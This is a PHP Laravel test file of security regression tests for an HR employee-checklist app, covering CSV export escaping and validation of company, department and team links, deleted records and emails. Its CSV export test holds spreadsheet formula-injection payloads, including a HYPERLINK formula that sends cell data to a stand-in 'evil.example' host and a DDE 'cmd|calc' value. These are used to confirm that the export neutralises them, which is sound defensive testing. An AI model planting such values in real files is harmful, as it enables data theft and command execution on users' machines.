<?php

namespace Tests\Feature;

use App\Models\ChecklistEntry;
use App\Models\ChecklistItem;
use App\Models\Company;
use App\Models\Department;
use App\Models\Team;
use App\Models\User;
use App\Services\HrRules;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/** Regression tests for review findings X1-X6, F1 and F5. All data is fake. */
class SecurityRegressionTest extends TestCase
{
    use RefreshDatabase;

    private function inertiaProps(User $user, string $url): array
    {
        $version = $this->actingAs($user)->get($url, ['X-Inertia' => 'true'])->headers->get('X-Inertia-Version') ?? '';

        return $this->actingAs($user)->get($url, ['X-Inertia' => 'true', 'X-Inertia-Version' => $version])->json('props');
    }

    /** An item that isn't required by HrRules, so switching it off is allowed. */
    private function optionalDocumentItem(): ChecklistItem
    {
        return ChecklistItem::where('list', 'document')->get()
            ->first(fn ($i) => ! in_array($i->key, HrRules::REQUIRED_KEYS['document'] ?? [], true));
    }

    // X1 --------------------------------------------------------------

    public function test_csv_export_neutralises_formula_cells(): void
    {
        [$company] = $this->baseData();
        $this->actingAs($this->user('hr'))->post('/employees', [
            'company_id' => $company->id,
            'full_name' => '=HYPERLINK("http://evil.example/?x="&A2,"click")',
            'role_title' => '@SUM(1+1)',
            'phone' => '+1+cmd|calc!A0',
            'notes' => 'n',
        ])->assertRedirect();
        $this->employee($company, ['full_name' => 'Tab Person', 'role_title' => "\tTabbed", 'phone' => '-5']);

        $csv = $this->actingAs($this->user('viewer'))->get('/export/employees')->streamedContent();

        $this->assertStringContainsString(',"\'=HYPERLINK(""http://evil.example/?x=""&A2,""click"")",', $csv);
        $this->assertStringContainsString(",'@SUM(1+1),", $csv);
        $this->assertStringContainsString(",'+1+cmd|calc!A0,", $csv);
        $this->assertStringContainsString("'\tTabbed", $csv);
        $this->assertStringContainsString(",'-5,", $csv);   // still readable: Excel shows -5 as text
        foreach (explode("\n", $csv) as $line) {
            foreach (str_getcsv($line, escape: '') as $cell) {
                $this->assertDoesNotMatchRegularExpression('/^[=+\-@\t\r]/', (string) $cell, "Unsafe cell: $cell");
            }
        }
        // Ordinary values are untouched.
        $this->assertStringContainsString('Tab Person', $csv);
        $this->assertStringContainsString('BCC-', $csv);
    }

    // X2 --------------------------------------------------------------

    public function test_department_from_other_company_rejected_when_company_omitted(): void
    {
        [$bcc] = $this->baseData();
        $emerge = Company::create(['name' => 'Emerge', 'code' => 'EM', 'employee_code_prefix' => 'Emerge-', 'employee_code_digits' => 3]);
        $emDept = Department::create(['company_id' => $emerge->id, 'name' => 'Sales']);
        $e = $this->employee($bcc);

        $this->actingAs($this->user('hr'))->put("/employees/{$e->id}", ['full_name' => $e->full_name, 'department_id' => $emDept->id])
            ->assertSessionHasErrors('department_id');
        $this->assertNull($e->fresh()->department_id);
    }

    public function test_own_company_department_still_accepted_when_company_omitted(): void
    {
        [$bcc, $dept] = $this->baseData();
        $e = $this->employee($bcc);

        $this->actingAs($this->user('hr'))->put("/employees/{$e->id}", ['full_name' => $e->full_name, 'department_id' => $dept->id])
            ->assertSessionHasNoErrors();
        $this->assertSame($dept->id, $e->fresh()->department_id);
    }

    public function test_team_from_other_department_rejected_when_department_omitted(): void
    {
        [$bcc, $dept] = $this->baseData();
        $other = Department::create(['company_id' => $bcc->id, 'name' => 'Finance']);
        $otherTeam = Team::create(['department_id' => $other->id, 'name' => 'Payroll']);
        $e = $this->employee($bcc, ['department_id' => $dept->id]);

        $this->actingAs($this->user('hr'))->put("/employees/{$e->id}", ['full_name' => $e->full_name, 'team_id' => $otherTeam->id])
            ->assertSessionHasErrors('team_id');
        $this->assertNull($e->fresh()->team_id);
    }

    // X3, X4 ----------------------------------------------------------

    public function test_bulk_update_rejects_soft_deleted_employee(): void
    {
        [$company] = $this->baseData();
        $e = $this->employee($company);
        $e->delete();
        $item = ChecklistItem::where('key', 'nda_signed')->firstOrFail();

        $this->actingAs($this->user('hr'))->post('/checklist/bulk', ['employee_ids' => [$e->id], 'item_id' => $item->id, 'status' => 'Yes'])
            ->assertSessionHasErrors('employee_ids.0');
        $this->assertSame(0, ChecklistEntry::where('employee_id', $e->id)->count());
    }

    public function test_soft_deleted_employee_cannot_be_manager(): void
    {
        [$company] = $this->baseData();
        $mgr = $this->employee($company);
        $mgr->delete();
        $e = $this->employee($company);

        $this->actingAs($this->user('hr'))->put("/employees/{$e->id}", ['company_id' => $company->id, 'full_name' => $e->full_name, 'manager_id' => $mgr->id])
            ->assertSessionHasErrors('manager_id');
        $this->assertNull($e->fresh()->manager_id);
    }

    // X5 --------------------------------------------------------------

    public function test_inactive_checklist_item_is_not_writable(): void
    {
        [$company] = $this->baseData();
        $e = $this->employee($company);
        $item = $this->optionalDocumentItem();
        $item->update(['is_active' => false]);
        $hr = $this->user('hr');

        $this->actingAs($hr)->put("/checklist/{$e->id}/{$item->id}", ['status' => 'Yes'])->assertNotFound();
        $this->actingAs($hr)->post('/checklist/bulk', ['employee_ids' => [$e->id], 'item_id' => $item->id, 'status' => 'Yes'])
            ->assertSessionHasErrors('item_id');
        $this->assertSame(0, ChecklistEntry::where('checklist_item_id', $item->id)->count());
    }

    // X6 --------------------------------------------------------------

    public function test_mixed_case_duplicate_email_is_a_validation_error(): void
    {
        $this->user('hr', ['email' => 'dup@test.local']);

        $this->actingAs($this->user('admin'))
            ->post('/settings/users', ['name' => 'D', 'email' => 'DUP@test.local', 'role' => 'hr', 'password' => 'password123'])
            ->assertRedirect()->assertSessionHasErrors('email');
        $this->assertSame(1, User::whereRaw('lower(email) = ?', ['dup@test.local'])->count());
    }

    public function test_new_user_email_is_saved_lowercased(): void
    {
        $this->actingAs($this->user('admin'))
            ->post('/settings/users', ['name' => 'N', 'email' => 'New.Person@Test.Local', 'role' => 'viewer', 'password' => 'password123'])
            ->assertSessionHasNoErrors();
        $this->assertTrue(User::where('email', 'new.person@test.local')->exists());
    }

    // F1 --------------------------------------------------------------

    /** Mirrors employees/form.tsx: on edit a blank employment type is sent back as '' then null. */
    public function test_edit_round_trip_keeps_blank_employment_type(): void
    {
        [$company] = $this->baseData();
        $hr = $this->user('hr');
        $e = $this->employee($company, ['full_name' => 'Bob', 'employment_type' => null]);
        $emp = $this->inertiaProps($hr, "/employees/{$e->id}/edit")['employee'];
        $this->assertNull($emp['employment_type']);

        $keys = ['company_id', 'employee_code', 'full_name', 'first_name', 'last_name', 'cnic', 'email', 'phone', 'department_id',
            'team_id', 'role_title', 'manager_id', 'start_date', 'hr_portal_id', 'attendance_machine', 'attendance_machine_id',
            'drive_folder_url', 'notes', 'review_note', 'employment_type'];
        $payload = [];
        foreach ($keys as $k) {
            $payload[$k] = $emp[$k] ?? '';   // form.tsx: employee.employment_type ?? '' on edit
        }
        $payload['needs_review'] = $emp['needs_review'] ?? false;
        $payload = array_map(fn ($v) => $v === '' ? null : $v, $payload);

        $this->actingAs($hr)->put("/employees/{$e->id}", $payload)->assertSessionHasNoErrors()->assertRedirect();
        $this->assertNull($e->fresh()->employment_type);
    }

    // F5 --------------------------------------------------------------

    public function test_users_page_sends_created_at_as_iso_8601(): void
    {
        $admin = $this->user('admin');
        $users = $this->inertiaProps($admin, '/settings/users')['users'];

        $this->assertNotEmpty($users);
        foreach ($users as $u) {
            $this->assertMatchesRegularExpression('/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}[+-]\d{2}:\d{2}$/', $u['created_at']);
        }
    }
}
